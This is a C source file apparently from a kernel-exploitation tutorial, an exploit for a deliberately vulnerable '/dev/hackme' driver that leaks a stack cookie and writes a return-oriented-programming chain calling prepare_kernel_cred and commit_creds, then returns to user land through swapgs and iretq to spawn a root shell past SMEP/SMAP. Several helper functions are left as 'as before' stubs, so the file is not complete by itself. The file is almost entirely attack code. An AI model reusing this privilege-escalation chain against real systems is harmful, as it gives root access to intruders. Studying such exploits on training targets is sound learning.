#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define formatBool(b) ((b) ? "true" : "false")

char *VULN_DRV = "/dev/hackme";

int64_t global_fd;
uint64_t cookie;
uint8_t cookie_off;
uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t prepare_kernel_cred = 0xffffffff814c67f0;
uint64_t commit_creds = 0xffffffff814c6410;
uint64_t pop_rdi_ret = 0xffffffff81006370;
uint64_t mov_rdi_rax_clobber_rsi140_pop1 = 0xffffffff816bf203;
uint64_t swapgs_pop1_ret = 0xffffffff8100a55f;
uint64_t iretq = 0xffffffff8100c0d9;

void open_dev(){
    // As before
};

void leak_cookie() {
  // As before
}

void spawn_shell() {
  /* Same as before as we're already back in user-land
   *  when this gets executed so SMEP/SMAP won't interfere
   */
}

void save_state() {
  // Same as before
}

void privesc() {
  // Do not need this one anymore as this caused problems
}

uint64_t user_rip = (uint64_t)spawn_shell;

void write_ret() {
  uint8_t sz = 35;
  uint64_t payload[sz];
  payload[cookie_off++] = cookie;
  payload[cookie_off++] = 0x0;
  payload[cookie_off++] = 0x0;
  payload[cookie_off++] = 0x0;
  payload[cookie_off++] = pop_rdi_ret;
  payload[cookie_off++] = 0x0;                 // Set up gfor rdi=0
  payload[cookie_off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
  payload[cookie_off++] =
      mov_rdi_rax_clobber_rsi140_pop1;  // save ret val in rdi
  payload[cookie_off++] = 0x0;          // compensate for extra pop rbp
  payload[cookie_off++] = commit_creds; // commit_creds(rdi)
  payload[cookie_off++] = swapgs_pop1_ret;
  payload[cookie_off++] = 0x0; // compensate for extra pop rbp
  payload[cookie_off++] = iretq;
  payload[cookie_off++] = user_rip;    // Notice the reverse order ...
  payload[cookie_off++] = user_cs;     // compared to how ...
  payload[cookie_off++] = user_rflags; // we returned these ...
  payload[cookie_off++] = user_sp;     // in the earlier ...
  payload[cookie_off++] = user_ss;     // exploit :)

  uint64_t data = write(global_fd, payload, sizeof(payload));

  puts("[!] If you can read this we failed the mission :(");
}

int main(int argc, char **argv) {
  open_dev();
  leak_cookie();
  save_state();
  write_ret();
}
